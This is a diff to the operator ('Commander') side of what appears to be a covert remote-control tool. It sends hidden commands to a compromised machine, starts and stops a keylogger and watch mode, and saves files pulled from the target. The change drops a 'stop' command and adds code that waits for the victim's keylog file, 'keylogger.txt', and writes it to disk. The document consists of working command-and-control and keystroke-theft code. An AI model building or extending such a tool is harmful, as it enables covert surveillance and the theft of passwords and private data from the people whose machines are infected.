@@ -167,7 +167,7 @@ class Commander:
         """Pretty-print a response dict from receive_data()."""
         print("\n" + "=" * 60)
         if response['type'] == int(CommandType.ACK):
-            # File transfer response — save to disk
+            # File transfer response save to disk
             if context and context.get('filename'):
                 filename = os.path.basename(context['filename'])
                 save_path = os.path.join(RECEIVED_DIR, filename)
@@ -300,9 +300,6 @@ class Commander:
                     )
                     self._watch_mode()
 
-                elif cmd == 'stop':
-                    self.send_covert_command(CommandType.STOP_WATCH)
-
                 elif cmd == 'keylog':
                     self.send_covert_command(CommandType.KEYLOG_START)
                     self._keylog_mode()
@@ -349,6 +346,12 @@ class Commander:
                         b''
                     )
                     self._stop_watch_listener()
+
+                    print("[*] Waiting for keylog file...")
+                    response = self.receive_response()
+                    if response:
+                        self.display_response(response, context={"filename": "keylogger.txt"})
+
                     print("[*] Keylog stopped. Resuming normal command mode.")
                     print("=" * 60)
                     break
